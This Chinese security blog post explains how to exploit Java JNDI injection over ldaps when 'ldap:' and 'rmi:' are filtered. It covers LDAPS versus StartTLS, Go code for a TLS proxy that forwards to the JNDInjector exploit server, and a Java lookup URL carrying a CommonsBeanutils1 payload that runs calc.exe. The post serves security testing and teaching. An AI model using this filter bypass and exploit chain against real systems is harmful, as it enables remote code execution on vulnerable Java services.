---
title: 如何巧妙构建“LDAPS”服务器利用JNDI注入
url: https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html
source: 离别歌
date: 2024-08-17
fetch_date: 2025-10-06T17:59:18.079792
---

# 如何巧妙构建“LDAPS”服务器利用JNDI注入

* [主页](/)
* 返回

Back to top
Share post

# 如何巧妙构建“LDAPS”服务器利用JNDI注入

phithon

Aug 16, 2024, 11:16 PM

阅读：23561

[网络安全](/sort/PENETRATION)

[jndi注入](/tag/jndi%E6%B3%A8%E5%85%A5),
[java安全](/tag/java%E5%AE%89%E5%85%A8)

前段时间看到群友问了这样一个问题：

[![image.png](/media/attachment/2024/08/16/9ca01b3b-e034-429f-8dc1-919d0b5058ee.2fd2c6d4623d.png)](/media/attachment/2024/08/16/9ca01b3b-e034-429f-8dc1-919d0b5058ee.png)

`ldap:`和`rmi:`关键字被拦截了，是否还可以进行JNDI注入。方法很简单，就是使用ldaps，但后来发现很多人并不知道怎么搭建LDAPS服务器，正好CoNote里有这个功能，写篇简单的文章讲讲。

## [0x01 LDAPs是什么](#0x01-ldaps)

在Java JNDI注入的过程中，用户传入一个URL，Java会根据URL的scheme来判断具体使用哪个包来处理，这些包的位置在`com.sun.jndi.url.*`中：

[![image.png](/media/attachment/2024/08/16/8912475f-3a7e-4bc6-94a9-486cef5d486f.638507786810.png)](/media/attachment/2024/08/16/8912475f-3a7e-4bc6-94a9-486cef5d486f.png)

可见，这里除了我们常见的rmi、ldap等，还有一个ldaps，我们看下`com.sun.jndi.url.ldaps.ldapsURLContextFactory`的代码：

```
package com.sun.jndi.url.ldaps;

import com.sun.jndi.url.ldap.*;

/**
 * An LDAP URL context factory that creates secure LDAP contexts (using SSL).
 *
 * @author Vincent Ryan
 */

final public class ldapsURLContextFactory extends ldapURLContextFactory {
}
```

代码比我的钱包还干净，可见ldap和ldaps实际都由`com.sun.jndi.url.ldap.ldapURLContextFactory`来处理。

这时就不得不说到[rfc4510](https://datatracker.ietf.org/doc/html/rfc4510)（其中包含rfc4511到rfc4519等多个RFC）了，这一系列RFC中对于LDAP定义了两种安全传输的方式：

* Opportunistic TLS
* LDAPS (LDAP over SSL/TLS)

[Opportunistic TLS](https://en.wikipedia.org/wiki/Opportunistic_TLS)，中文描述为“机会性TLS加密”，意思就是在普通明文通信过程中找“机会”通过某种方式将连接升级成TLS通信。这个概念不止在LDAP中存在，在很多其他协议里也能看到它的身影，最常见的就是SMTP中的**STARTTLS**命令。

SMTP通信时，客户端与服务端在标准端口（默认为25）上建立 TCP 连接，并且客户端会发送STARTTLS命令告诉服务端开始TLS握手，然后就是常规的TLS握手过程，握手完成后，二者就开始加密通信。

LDAP协议也支持Opportunistic TLS，客户端在原始的通信中也可以通过“StartTLS”开启TLS握手过程。

相比于Opportunistic TLS，LDAPS (LDAP over SSL/TLS)的通信过程就简单很多，LDAPS实际上就是将普通的LDAP协议通信过程包裹一层TLS，客户端在第一次连接服务端口时就需要开始TLS握手。

LDAP和LDAPS的关系可以类比为HTTP和HTTPS，在Java的JNDI中，ldaps通信过程就是使用“LDAPS (LDAP over SSL/TLS)”来实现的。

## [0x02 CoNote中使用ldaps探测JNDI注入漏洞](#0x02-conoteldapsjndi)

CoNote作为一个多功能信息安全测试套件，用于让我们在安全测试、代码审计、Bug Bounty的过程中更方便地确认漏洞的存在，并快速构建复现漏洞的POC。

CoNote中就包含ldap日志的功能，除了支持普通的ldap协议外，也同时支持ldaps。

简单演示一下在CoNote中，如何使用ldaps来探测目标是否存在JNDI注入漏洞。首先，我们在Dashboard中生成或绑定自定义域名，然后在LDAP日志页面，就可以看到探测漏洞所使用的ldaps URL：

[![image.png](/media/attachment/2024/08/16/b693d895-3edc-40e3-a14b-84b458ce9d5c.ebab95d3ea79.png)](/media/attachment/2024/08/16/b693d895-3edc-40e3-a14b-84b458ce9d5c.png)

复制任意一个URL，填入下面这个简单的Java类中跑一下即可成功收到LDAP日志：

```
import javax.naming.Context;
import javax.naming.InitialContext;

public class Sample {
    public static void main(String[] args) throws Exception {
        Context ctx = new InitialContext();
        ctx.lookup("ldaps://[domain]:636/[domain]/ldaps");
    }
}
```

这个小demo对于Java的版本是没有限制的。我昨天也在『[代码审计](https://t.zsxq.com/JryN1)』星球里说过了这个问题：

> 说到RMI日志和LDAP日志，当时做这两个功能的时候有CoNote的用户就问我，高版本Java是不是用不上了？
>
> 但实际上检测漏洞是不受Java版本影响的（至少到Java 17是这样的），如果CoNote能接收到RMI请求或者LDAP请求，说明存在JNDI注入的问题。至于后续是否可以执行命令，是否需要找利用链，这个就取决于Java版本了。

探测JNDI注入对Java版本没有要求，对于CoNote来说，只是探测漏洞是否存在，做到这一步也就够了。

## [0x03 “编写”LDAPs服务器](#0x03-ldaps)

那么对于redteam来说，只检测JNDI注入存在当然是不够的，如何才能建立一个恶意ldaps服务器并利用漏洞呢？很多师傅也提出过这个问题：

[![image.png](/media/attachment/2024/08/16/dcd1db83-a3d3-4d62-8bf9-e3baaeca3dbb.4429844bf840.png)](/media/attachment/2024/08/16/dcd1db83-a3d3-4d62-8bf9-e3baaeca3dbb.png)

其实部分人就钻牛角尖了，我们完全不需要自己编写ldaps服务端，网上有很多现成的JNDI注入利用工具，比如我很喜欢@rebeyond 的[JNDInjector](https://github.com/rebeyond/JNDInjector)，选择好利用链与Payload，就可以生成一个ldap协议的恶意URL：

[![image.png](/media/attachment/2024/08/16/447a0e5a-4a14-48e9-b3f8-b006726f8724.3e421b1f5794.png)](/media/attachment/2024/08/16/447a0e5a-4a14-48e9-b3f8-b006726f8724.png)

当然，这个工具并不支持ldaps，但我们完全可以编写一个TLS反向代理作为中间件，将ldaps请求代理转发给JNDInjector来实现我们的需求。

我曾经在《[用原生socket发送HTTP数据包](https://mp.weixin.qq.com/s/VahJWS6lsbPC7-RVxA9w1w)》这篇文章里介绍了如何使用Python发送原生socket数据包，文中提到了HTTPS，其发送原生HTTPS数据包的方法就是使用TLS将普通TCP包裹一层。

对于LDAPS场景来说完全一样，首先使用`tls.LoadX509KeyPair`加载TLS使用的证书和私钥，并使用`tls.Listen`创建一个TCP over TLS服务器：

```
cert, err := tls.LoadX509KeyPair(certPath, keyPath)
if err != nil {
    log.Fatalf(err.Error())
}
config := &tls.Config{Certificates: []tls.Certificate{cert}}

listener, err := tls.Listen("tcp", localAddr, config)
if err != nil {
    log.Fatalf(err.Error())
}
defer listener.Close()
```

然后使用一个for循环接收请求，每当有新的连接到来时，调用`handleConnection()`处理：

```
for {
    conn, err := listener.Accept()
    if err != nil {
        log.Printf(err.Error())
        continue
    }

    log.Println("new connection from", conn.RemoteAddr())
    go handleConnection(conn, remoteAddr)
}
```

handleConnection中的内容就是将原始的输入流，使用`io.Copy`转发给上游TCP服务；将上游TCP返回流，转发给原始的连接：

```
func handleConnection(src net.Conn, remoteAddr string) {
    defer src.Close()

    dest, err := net.Dial("tcp", remoteAddr)
    if err != nil {
        log.Printf(err.Error())
        return
    }
    defer dest.Close()

    go io.Copy(dest, src)
    io.Copy(src, dest)
}
```

这就实现了一个简单的TLS端口转发的过程，我将这段代码开源在Github上：<https://github.com/phith0n/tls_proxy>。

## [0x04 使用tls\_proxy+JNDInjector利用漏洞](#0x04-tls_proxyjndinjector)

最后，看看整个漏洞的利用过程是怎样的。

首先，在JNDInjector中选择一个利用链和要执行的命令并启动服务，我这里选择CommonsBeanutils1。如果你的Java版本在8u191以下，也可以不使用任何反序列化利用链。

我将JNDInjector启动的ldap服务监听在1389端口上，然后使用tls\_proxy代理转发：

```
./tproxy -l 127.0.0.1:1636 -r 127.0.0.1:1389 -c cert.pem -k key.pem
```

注意，这里的cert.pem和key.pem需要是一个合法的TLS证书，我们直接使用certbot或者[ssl for free](https://www.sslforfree.com/)这种在线服务上申请即可。

tls代理启动后，其监听在1636端口，然后我们改下上面那个Java demo（需要安装下CommonsBeanutils依赖），指向1636端口：

```
import javax.naming.Context;
import javax.naming.InitialContext;

public class Sample {
    public static void main(String[] args) throws Exception {
        Context ctx = new InitialContext();
        ctx.lookup("ldaps://[domain]:1636/EpvahjVjjH/CommonsBeanutils1/Exec/eyJjbWQiOiJjYWxjLmV4ZSJ9");
    }
}
```

执行成功弹出计算器：

[![image.png](/media/attachment/2024/08/16/2be7ecd9-f826-4348-844b-7651169127c9.8f74dc39bc55.png)](/media/attachment/2024/08/16/2be7ecd9-f826-4348-844b-7651169127c9.png)

在JNDInjector中，也收到了漏洞利用成功的日志：

[![image.png](/media/attachment/2024/08/16/7a79b16f-9082-4e82-9d18-dc79a65efe26.fb4b2252b031.png)](/media/attachment/2024/08/16/7a79b16f-9082-4e82-9d18-dc79a65efe26.png)

# 赞赏

喜欢这篇文章？打赏1元

![](/static/wx.jpg)

# 评论

![](/static/placeholder.jpg)

星空

Mar 23, 2025, 2:38 PM
回复

哎呀学弟来🦐了

![](https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g)

[phithon](https://www.leavesongs.com)

Mar 24, 2025, 10:09 AM
回复

@星空 SeaTalk找我吧

![](https://secure.gravatar.com/avatar/ca7c27efec3c8d7fd9c2a9593f03c5ea.jpg?s=100&d=mm&r=g)

Jsting

Dec 20, 2024, 2:47 PM
回复

想+P神的微信可以吗

![captcha](/captcha/image/cef5e7ea115bbe01791b5e1e84d4f48d39689c44/)

Copyright © 2025 Powered by talkbook

* [首页](/)
* [RSS订阅](/feed/)
* [微博](http://weibo.com/101yx)
* [项目](https://github.com/phith0n)
* [更换模板](/template/change/)